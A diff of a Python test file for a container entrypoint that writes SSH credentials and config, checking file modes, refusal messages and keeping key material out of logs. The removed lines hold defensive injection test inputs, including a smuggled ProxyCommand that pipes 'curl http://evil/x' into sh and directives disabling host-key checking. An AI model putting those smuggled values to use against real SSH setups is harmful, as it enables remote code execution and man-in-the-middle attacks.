@@ -1,10 +1,15 @@
-"""The container entrypoint's one job: write ~/.ssh/config, then get out of the way.
+"""The container entrypoint's one job: fill ~/.ssh, then get out of the way.
 
 This runs before `vcows` exists as a process -- `install()` parses the config
 itself and `os.execv`s afterwards -- so nothing the schema rejects has been
-rejected yet by the time this file is written. That ordering is why the path
+rejected yet by the time these files are written. That ordering is why the type
 check lives here as well as in `TARGET_SCHEMA`, and it is the whole reason this
 module is tested at all rather than left to the image gate.
+
+The credentials are contents now, not paths, so what is asserted here is where
+they land and at what mode. The key comes from `conftest.SSH_KEY`, which is the
+one fixture key in the suite and is assembled so that no file on disk -- source
+or `.pyc` -- ever holds a whole PEM header. See the note beside it.
 
 Ungated and offline: nothing here imports libvirt or touches a hypervisor.
 """
@@ -20,96 +25,78 @@ from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
+import yaml
 
 from container import entrypoint
+from tests.conftest import KNOWN_HOSTS as GOOD_HOSTS
+from tests.conftest import SSH_KEY as GOOD_KEY
 
-GOOD_KEY = "/run/secrets/id_ed25519"
-GOOD_HOSTS = "/run/secrets/known_hosts"
-
-#: Every directive the written file is supposed to carry, and no others.
-DIRECTIVES = [
-    "Host *",
-    "BatchMode yes",
-    "ServerAliveInterval 30",
-    "ServerAliveCountMax 6",
-    f"IdentityFile {GOOD_KEY}",
-    "IdentitiesOnly yes",
-    f"UserKnownHostsFile {GOOD_HOSTS}",
-    "StrictHostKeyChecking yes",
-]
-
-#: Each one appends a directive of its own to a file that is read line by line.
-INJECTIONS = [
-    "/run/secrets/k\n  ProxyCommand /bin/sh -c 'curl http://evil/x | sh'",
-    "/run/secrets/k\n  StrictHostKeyChecking no",
-    "/run/secrets/k\n  UserKnownHostsFile /dev/null",
-    "/run/secrets/k\n",
-    "/run/secrets/k\r  ProxyCommand /bin/false",
-    "/run/secrets/k with a space",
-    "relative/path",
-    "",
-]
+#: The two fixed paths under the home the entrypoint finds, relative to `.ssh`.
+#: Fixed rather than configurable is what makes `ssh_config` interpolate nothing
+#: the operator wrote.
+KEY_NAME = entrypoint.KEY_NAME
+HOSTS_NAME = entrypoint.HOSTS_NAME
 
 
 # -- the rendered file -------------------------------------------------------
 
 
 def test_the_written_config_carries_exactly_the_documented_directives():
-    body = entrypoint.ssh_config(GOOD_KEY, GOOD_HOSTS)
+    body = entrypoint.ssh_config(Path("/h/.ssh/k"), Path("/h/.ssh/kh"))
     assert [ln.strip() for ln in body.splitlines() if not ln.startswith("#")] == [
-        d.strip() for d in DIRECTIVES
+        "Host *",
+        "BatchMode yes",
+        "ServerAliveInterval 30",
+        "ServerAliveCountMax 6",
+        "IdentityFile /h/.ssh/k",
+        "IdentitiesOnly yes",
+        "UserKnownHostsFile /h/.ssh/kh",
+        "StrictHostKeyChecking yes",
     ]
 
 
 def test_either_credential_alone_writes_only_its_own_half():
-    assert "UserKnownHostsFile" not in entrypoint.ssh_config(GOOD_KEY, None)
-    assert "IdentityFile" not in entrypoint.ssh_config(None, GOOD_HOSTS)
+    assert "UserKnownHostsFile" not in entrypoint.ssh_config(Path("/h/k"), None)
+    assert "IdentityFile" not in entrypoint.ssh_config(None, Path("/h/kh"))
 
 
-# -- injection ---------------------------------------------------------------
+# -- values that are not credentials ----------------------------------------
 
 
-@pytest.mark.parametrize("value", INJECTIONS)
-def test_a_keyfile_that_is_not_a_plain_path_is_refused(value):
-    """`ProxyCommand` in ~/.ssh/config is command execution on the next
-    connection, and both clients read that file -- which is the entire reason it
-    is written here rather than passed in the URI."""
-    with pytest.raises(ValueError):
-        entrypoint.ssh_config(value, GOOD_HOSTS)
+#: A YAML mapping is not a list of strings, and `target.libvirt.ssh_key` can be
+#: any of these before `vcows validate` has run. Each used to be an unhandled
+#: `TypeError` out of the write.
+NOT_A_CREDENTIAL = [42, ["a", "b"], {"path": "/k"}, True, "", "   \n"]
 
 
-@pytest.mark.parametrize("value", INJECTIONS)
-def test_a_known_hosts_that_is_not_a_plain_path_is_refused(value):
-    with pytest.raises(ValueError):
-        entrypoint.ssh_config(GOOD_KEY, value)
-
-
-@pytest.mark.parametrize(
-    "field, args",
-    [
-        ("ssh_keyfile", (INJECTIONS[0], GOOD_HOSTS)),
-        ("known_hosts", (GOOD_KEY, INJECTIONS[0])),
-    ],
-)
-def test_the_refusal_names_the_field_that_carried_the_value(field, args):
-    """Two credentials go through one check, and the operator's next move is to
-    edit the key that was refused. Naming the other one sends them to a value
-    that is fine."""
+@pytest.mark.parametrize("field", ["ssh_key", "known_hosts"])
+@pytest.mark.parametrize("value", NOT_A_CREDENTIAL)
+def test_a_credential_that_is_not_text_is_refused_by_name(field, value):
+    """The operator's next move is to edit the key that was refused, so the
+    message names it. The value never appears: `ssh_key` is the private key."""
     with pytest.raises(ValueError, match=field):
-        entrypoint.ssh_config(*args)
+        entrypoint.credential(value, field)
+
+
+def test_a_credential_gains_the_trailing_newline_openssh_wants():
+    """`ssh_key: |-` in YAML strips it, and OpenSSH rejects a key whose final
+    line has no terminator -- a failure that names neither the config nor the
+    chomping indicator that caused it."""
+    assert entrypoint.credential("no newline", "ssh_key") == "no newline\n"
 
 
 # -- install() ---------------------------------------------------------------
 
 
-def config_file(tmp_path, keyfile=GOOD_KEY, known_hosts=GOOD_HOSTS):
+def config_file(tmp_path, ssh_key=GOOD_KEY, known_hosts=GOOD_HOSTS):
+    """A config carrying the credentials themselves, as a site now writes one."""
+    libvirt: dict = {}
+    if ssh_key is not None:
+        libvirt["ssh_key"] = ssh_key
+    if known_hosts is not None:
+        libvirt["known_hosts"] = known_hosts
     path = tmp_path / "deployment.yaml"
-    path.write_text(
-        "target:\n"
-        "  libvirt:\n"
-        f"    ssh_keyfile: {keyfile!r}\n"
-        f"    known_hosts: {known_hosts!r}\n"
-    )
+    path.write_text(yaml.safe_dump({"target": {"libvirt": libvirt}}))
     return path
 
 
@@ -173,34 +160,56 @@ def fake_home(tmp_path, monkeypatch):
     return home
 
 
-def test_install_writes_the_file_for_a_good_config(tmp_path, fake_home):
+def test_install_writes_both_credentials_and_a_config_naming_them(tmp_path, fake_home):
+    """The whole of what changed: the key is *copied* into the container now.
+
+    Both halves. `known_hosts` is the one the URI cannot carry at all, so a run
+    that installed only the key would fail at the host key check.
+    """
     entrypoint.install([str(config_file(tmp_path))])
-    written = fake_home / ".ssh" / "config"
-    body = written.read_text()
-    # Both halves. `known_hosts` is the one the URI cannot carry at all, so a
-    # config that installed only the key would fail at the host key check.
-    assert f"IdentityFile {GOOD_KEY}" in body
-    assert f"UserKnownHostsFile {GOOD_HOSTS}" in body
-    assert written.stat().st_mode & 0o777 == 0o600
+    ssh = fake_home / ".ssh"
+    key, hosts = ssh / KEY_NAME, ssh / HOSTS_NAME
+
+    assert key.read_text() == GOOD_KEY
+    assert hosts.read_text() == GOOD_HOSTS
+    body = (ssh / "config").read_text()
+    assert f"IdentityFile {key}" in body
+    assert f"UserKnownHostsFile {hosts}" in body
+    # The key file above all: ssh refuses a private key any group can read, so
+    # a wrong mode here is a connection failure as well as an exposure.
+    for path in (key, hosts, ssh / "config"):
+        assert path.stat().st_mode & 0o777 == 0o600, path
 
 
+#: Explicit ids, because pytest builds one from the values otherwise -- and
+#: `.pytest_cache/v/cache/nodeids` then holds the whole fixture key, which the
+#: gitleaks gate reads and reports. Measured: one finding, in the cache only.
 @pytest.mark.parametrize(
-    "field, value, directive",
+    "field, value, name, directive",
     [
-        ("ssh_keyfile", GOOD_KEY, f"IdentityFile {GOOD_KEY}"),
-        ("known_hosts", GOOD_HOSTS, f"UserKnownHostsFile {GOOD_HOSTS}"),
+        pytest.param("ssh_key", GOOD_KEY, KEY_NAME, "IdentityFile", id="ssh_key"),
+        pytest.param(
+            "known_hosts",
+            GOOD_HOSTS,
+            HOSTS_NAME,
+            "UserKnownHostsFile",
+            id="known_hosts",
+        ),
     ],
 )
 def test_install_writes_the_one_credential_it_was_given(
-    tmp_path, fake_home, field, value, directive
+    tmp_path, fake_home, field, value, name, directive
 ):
     """Either alone is a usable config: a key for a host already in the default
     known_hosts, or a known_hosts for a key an agent supplies."""
     path = tmp_path / "deployment.yaml"
-    path.write_text(f"target:\n  libvirt:\n    {field}: {value!r}\n")
+    path.write_text(yaml.safe_dump({"target": {"libvirt": {field: value}}}))
 
     entrypoint.install([str(path)])
-    assert directive in (fake_home / ".ssh" / "config").read_text()
+    ssh = fake_home / ".ssh"
+    assert (ssh / name).read_text() == value
+    assert f"{directive} {ssh / name}" in (ssh / "config").read_text()
+    assert sorted(p.name for p in ssh.iterdir()) == sorted(["config", name])
 
 
 def test_install_writes_nothing_when_the_config_names_no_credential(
@@ -223,7 +232,7 @@ def test_install_makes_a_home_that_is_not_there_yet(tmp_path, monkeypatch):
     monkeypatch.setattr(entrypoint, "home", lambda: home)
 
     entrypoint.install([str(config_file(tmp_path))])
-    assert f"IdentityFile {GOOD_KEY}" in (home / ".ssh" / "config").read_text()
+    assert (home / ".ssh" / KEY_NAME).read_text() == GOOD_KEY
 
 
 @pytest.mark.parametrize(
@@ -241,14 +250,22 @@ def test_install_survives_a_config_shaped_nothing_like_one(tmp_path, fake_home, 
 
 def test_a_mounted_ssh_config_wins_and_says_so(tmp_path, fake_home, capsys):
     """Theirs wins, which is the documented behaviour. The silence was not: a
-    credential the config named and nothing installed looks like a vcows bug."""
+    credential the config named and nothing installed looks like a vcows bug.
+
+    The config is written *first* for this reason. Writing the key first would
+    leave the operator's own config governing a private key vcows had already
+    copied into the container, and the message below would be false.
+    """
     ssh = fake_home / ".ssh"
     ssh.mkdir(mode=0o700)
     (ssh / "config").write_text("Host *\n  IdentityFile /mine\n")
 
     entrypoint.install([str(config_file(tmp_path))])
     assert (ssh / "config").read_text() == "Host *\n  IdentityFile /mine\n"
-    assert "already exists" in capsys.readouterr().err
+    assert not (ssh / KEY_NAME).exists(), "the key was copied in anyway"
+    err = capsys.readouterr().err
+    assert "already exists" in err
+    assert str(ssh / "config") in err, "the warning has to name the file that won"
 
 
 def test_the_mode_comes_from_the_create_not_a_later_chmod(
@@ -279,11 +296,13 @@ def test_the_mode_comes_from_the_create_not_a_later_chmod(
     finally:
         os.umask(previous)
 
-    assert (fake_home / ".ssh" / "config").stat().st_mode & 0o777 == 0o600
+    ssh = fake_home / ".ssh"
+    for name in ("config", KEY_NAME, HOSTS_NAME):
+        assert (ssh / name).stat().st_mode & 0o777 == 0o600, name
     # The directory too, and for the same reason: `mkdir` without a mode creates
     # at 0o777 & ~umask, which under this umask is 0755 -- a world-readable
-    # directory holding a file that names the operator's private key.
-    assert (fake_home / ".ssh").stat().st_mode & 0o777 == 0o700
+    # directory now holding the private key itself.
+    assert ssh.stat().st_mode & 0o777 == 0o700
 
 
 def test_a_config_arriving_after_the_check_is_not_truncated(
@@ -333,6 +352,11 @@ def test_an_unwritable_home_says_what_it_costs(tmp_path, monkeypatch, capsys):
     err = capsys.readouterr().err
     assert "could not write" in err
     assert "were not installed" in err
+    # The directory and the errno are the two facts the operator has to act on.
+    # The phrase, not the bare path: the OSError's own text repeats the path,
+    # so a message that dropped the directory would still contain it.
+    assert f"could not write into {blocked / '.ssh'}:" in err
+    assert "Not a directory" in err
 
 
 # -- #13: which verbs get an SSH config at all ------------------------------
@@ -375,7 +399,7 @@ def test_a_connecting_verb_still_gets_its_ssh_config(
     )
     entrypoint.main()
 
-    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()
+    assert (fake_home / ".ssh" / KEY_NAME).read_text() == GOOD_KEY
 
 
 def test_a_config_file_named_like_an_offline_verb_is_not_read_as_one(
@@ -388,16 +412,21 @@ def test_a_config_file_named_like_an_offline_verb_is_not_read_as_one(
     monkeypatch.setattr(sys, "argv", ["entrypoint", "deploy", str(named)])
     entrypoint.main()
 
-    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()
+    assert (fake_home / ".ssh" / KEY_NAME).read_text() == GOOD_KEY
 
 
-def test_install_writes_nothing_for_a_poisoned_config(tmp_path, fake_home, capsys):
-    """Refusing after writing would be no refusal at all: the next `ssh` reads the
-    file, and `vcows validate`'s rejection comes too late to matter."""
-    path = config_file(tmp_path, keyfile="/run/secrets/k\n  ProxyCommand /bin/false")
+def test_install_writes_nothing_when_a_credential_is_not_text(
+    tmp_path, fake_home, capsys
+):
+    """Refused before anything is written, and refused without echoing the value:
+    `ssh_key` is the private key itself now, so a message quoting what it found
+    would put key material in `podman logs`."""
+    path = config_file(tmp_path, ssh_key={"path": "/run/secrets/k"})
     entrypoint.install([str(path)])
-    assert not (fake_home / ".ssh" / "config").exists()
-    assert "ProxyCommand" not in capsys.readouterr().err
+    assert not (fake_home / ".ssh").exists()
+    err = capsys.readouterr().err
+    assert "ssh_key" in err
+    assert "/run/secrets/k" not in err
 
 
 def test_a_flag_is_neither_the_verb_nor_the_config(tmp_path, monkeypatch):
@@ -423,7 +452,7 @@ def test_install_is_handed_every_argument_not_just_what_follows_the_verb(
     monkeypatch.setattr(sys, "argv", ["entrypoint", "deploy"])
     entrypoint.main()
 
-    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()
+    assert (fake_home / ".ssh" / KEY_NAME).read_text() == GOOD_KEY
 
 
 # -- the window before the exec ---------------------------------------------
